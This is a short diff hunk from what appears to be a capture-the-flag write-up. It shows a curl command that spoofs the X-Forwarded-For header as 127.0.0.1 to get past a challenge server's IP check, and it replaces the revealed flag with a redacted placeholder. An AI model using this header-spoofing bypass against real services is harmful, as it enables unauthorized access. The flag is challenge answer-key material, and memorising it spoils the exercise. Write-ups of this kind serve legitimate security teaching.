@@ -113,7 +113,7 @@ app.listen(3000, () => {
 
 ```shell
 $ curl -H "X-Forwarded-For: 127.0.0.1" http://34.170.146.252:42474
-Alpaca{0verwrite_X-Forwarded-For_at_the_3dge}
+Alpaca{REDACTED}
 ```
 
 ---
